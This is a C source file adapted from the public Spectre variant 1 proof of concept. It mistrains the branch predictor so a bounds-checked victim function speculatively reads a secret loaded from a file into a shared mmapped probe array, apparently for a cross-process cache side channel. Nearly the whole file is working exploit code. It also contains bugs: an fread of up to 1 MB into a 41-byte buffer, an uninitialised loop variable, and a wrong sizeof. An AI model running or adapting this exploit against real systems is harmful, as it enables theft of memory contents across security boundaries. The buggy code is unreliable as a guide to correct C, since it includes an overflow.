#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64]; 
uint8_t *array2;

char secret[] = "The Magic Words are Squeamish Ossifrage.";

int victim_function(size_t x) {
	static uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
	return temp;
}


/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x) {
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	/* for (tries = 999; tries > 0; tries--) { */

		/* Flush array2[256*(0..255)] from cache */
	/* for (i = 0; i < 256; i++) */
	/* 	_mm_clflush(&array2[i * 512]);  #<{(| intrinsic for clflush instruction |)}># */

	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	training_x = tries % array1_size;
	for (j = 100; j >= 0; j--) {
		_mm_clflush(&array1_size);
		for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */

		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		/* Avoid jumps in case those tip off the branch predictor */
		x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
		x = training_x ^ (x & (malicious_x ^ training_x));

		/* Call the victim! */
		victim_function(x);
	}
	/* } */
}

int main(int argc, const char **argv) {
	int fd = open("./shared_file", O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	close(fd);

	FILE *in = fopen("./super_secret", "r");
	if (in == NULL) {
		printf("not open\n");
		return 0;
	}
	int read = fread(secret, sizeof(char), 1024 * 1024, in);
	fclose(in);

	printf("%s\n", secret);

	if (array2 == MAP_FAILED) {
		printf("map failed %d >< %d\n", errno, EBADF);
		return 0;
	}

	size_t malicious_x = (size_t)(secret - (char*)array1);   /* default for malicious_x */
	int i, score[2], offset;
	uint8_t value[2];

	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1;    /* write to array2 so in RAM not copy-on-write zero pages */

	if (argc == 2) {
		sscanf(argv[1], "%d", &offset);
		printf("given offset: %d\n", offset);
	} else {
		printf("Required argument: offset");
		return 0;
	}

	readMemoryByte(malicious_x + offset);

	return 0;
}
